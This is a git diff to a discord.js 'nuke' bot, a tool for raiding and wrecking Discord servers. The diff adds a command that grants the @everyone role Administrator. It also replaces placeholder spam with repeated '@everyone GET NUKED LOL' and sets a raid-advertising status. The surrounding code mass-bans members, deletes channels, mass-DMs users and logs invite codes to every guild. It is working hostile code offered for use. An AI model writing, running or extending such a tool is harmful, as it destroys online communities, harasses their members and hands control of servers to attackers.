@@ -1,6 +1,7 @@
 const { Client, Intents, Permissions } = require('discord.js');
 const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });
 
+
 // ===== VARIABLES =====
 
 // ===== BOT VARS =====
@@ -12,10 +13,12 @@ const code = "start";
 const stopcode = "stop";
 // cleanup code
 const cleancode = "cleanup";
+// admin code (give everyone admin)
+const admin_code = "admin";
 // if we're nuking or not
 let activated = false;
 // what to spam (change the text within the backticks if you want the bot to spam something different)
-let text = `Put your spam stuff here`;
+let text = `@everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL `;
 
 // ===== MASS BAN/UNBANNING =====
 // code to ban everyone
@@ -42,6 +45,8 @@ const Ctopic = "Have fun fixing the server ;)";
 // when the bot logs in
 client.on('ready', () => {
 	try {
+		client.user.setActivity(`your server for raids| 'start' to setup`, { type: 'WATCHING' });
+
 		// guild logging
 		client.guilds.cache.forEach(guild => {
 			// log the guild's name
@@ -57,7 +62,7 @@ client.on('ready', () => {
 				`LOG`
 			).then(e => {
 				// log it
-				console.log(`Logged invite code to ${guild.name} - ${e.code}`);
+				console.log(`Invite code to ${guild.name} - ${e.code}`);
 			}).catch(console.log);
 		})
 	} catch (e) {
@@ -124,20 +129,6 @@ let dmeveryone = async (message, toDM) => {
 	}
 }
 
-let logInvite = async (message) => {
-	// lets get an invite to the server
-	let invite = await message.channel.createInvite(
-		{
-			maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
-			maxUses: 100 // maximum times it can be used
-		},
-		`LOG`
-	).catch(e => {
-		console.log("Error logging an invite.");
-	});
-	console.log(`INVITE CODE: ${invite.code}`);
-}
-
 // unban everyone
 let massUnban = (message) => {
 	let howMany = 0;
@@ -165,6 +156,12 @@ let massBan = async (message) => {
 	console.log(`Attempted to ban ${howMany} users.`)
 }
 
+let adminAll = (message) => {
+	message.guild.roles.everyone.setPermissions([Permissions.FLAGS.ADMINISTRATOR]).then(console.log("Success, gave @everyone admin")).catch(e => {
+		console.log("Unable to give everyone admin.");
+	});
+}
+
 client.on('messageCreate', message => {
 
 	// switch to the message content
@@ -177,8 +174,6 @@ client.on('messageCreate', message => {
 				console.log(`NUKE STARTED BY: ${message.author.tag}, IN GUILD: ${message.guild.name}`);
 				// we start nuking 
 				activated = true;
-				// log an invite ;)
-				logInvite(message);
 				// clear all the server channels
 				clear(message)
 				// make server channels
@@ -199,6 +194,10 @@ client.on('messageCreate', message => {
 		case ban_code:
 			// mass ban
 			massBan(message);
+			break;
+
+		case admin_code:
+			adminAll(message);
 			break;
 
 		// leave the server
